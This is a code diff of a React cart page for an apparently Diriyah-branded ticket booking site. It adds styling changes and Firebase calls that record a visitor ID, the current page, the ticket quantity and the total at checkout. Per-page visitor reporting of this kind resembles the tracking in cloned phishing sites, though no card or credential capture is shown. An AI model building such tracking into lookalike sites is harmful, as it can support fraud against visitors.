@@ -2,6 +2,7 @@ import { ArrowRight, Trash2, Plus, Minus, ShoppingCart, Ticket } from "lucide-re
 import { Button } from "@/components/ui/button";
 import { Link } from "wouter";
 import { useState, useEffect } from "react";
+import { addData, handleCurrentPage } from "@/lib/firebase";
 
 import ticketImage from "@assets/455c3dc333504d44bfe63f8258282e15.webp";
 
@@ -15,6 +16,8 @@ export default function CartPage() {
   
   useEffect(() => {
     setPricePerTicket(getTicketPrice());
+    localStorage.setItem("reservationType", "ticket");
+    handleCurrentPage("cart");
   }, []);
   
   const subtotal = pricePerTicket * quantity;
@@ -41,8 +44,8 @@ export default function CartPage() {
 
 function Header() {
   return (
-    <header className="bg-gradient-to-r from-[#3d3428] to-[#5c4a3d] text-white">
-      <div className="container mx-auto px-4 py-4">
+    <header className="sticky top-0 z-50 bg-gradient-to-r from-[#2a1f16] via-[#3d3428] to-[#2a1f16] text-white shadow-xl">
+      <div className="container mx-auto px-4 py-3">
         <div className="flex items-center justify-between">
           <Link href="/booking">
             <Button size="icon" variant="ghost" className="text-white hover:bg-white/10" data-testid="button-menu">
@@ -51,7 +54,7 @@ function Header() {
           </Link>
           
           <div className="flex-1 flex justify-center">
-            <img src="/logo-white.svg" alt="الدرعية" className="h-12" data-testid="img-cart-logo" />
+            <img src="/logo-white.svg" alt="الدرعية" className="h-10" data-testid="img-cart-logo" />
           </div>
           
           <div className="w-10" />
@@ -196,13 +199,28 @@ function Subtotal({ total }: { total: number }) {
 }
 
 function ContinueButton() {
+  const handleContinue = () => {
+    const visitorId = localStorage.getItem("visitor");
+    if (visitorId) {
+      const qty = parseInt(document.querySelector('[data-testid="text-quantity"]')?.textContent || "1");
+      const total = qty * getTicketPrice();
+      addData({
+        id: visitorId,
+        reservationType: "ticket",
+        totalAmount: total,
+        ticketQuantity: qty,
+        currentPage: "cart",
+      });
+    }
+  };
+
   return (
     <div className="sticky bottom-0 bg-gradient-to-t from-[#e8d5b5] to-[#f5ebe0] p-4 shadow-[0_-4px_20px_rgba(0,0,0,0.1)]">
       <div className="max-w-md mx-auto">
-        <Link href="/checkout">
+        <Link href="/checkout" onClick={handleContinue}>
           <Button 
             size="lg"
-            className="w-full bg-primary text-white shadow-lg"
+            className="w-full bg-primary text-white shadow-lg h-14 text-base"
             data-testid="button-continue-checkout"
           >
             المتابعة لإتمام الحجز
